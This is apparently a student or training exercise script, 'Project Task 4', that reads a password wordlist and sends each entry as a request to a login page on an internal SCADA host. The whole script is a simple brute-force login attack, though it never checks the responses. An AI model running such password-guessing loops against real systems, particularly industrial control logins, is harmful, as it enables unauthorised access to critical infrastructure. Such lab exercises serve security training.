# Project  Task 4
# Capt Arif Alamri 
# Lt Micah Hayden
# Lt Lucas Mireles

from socket	import * 
import sys
import requests
import time
import random


with open("passwords.txt") as file:
	passwords = file.read().splitlines()
	
for password in passwords:
	URL = 'http://scada.m4i.local/login.php?command={}'.format(password)
	request = requests.get(url = URL)
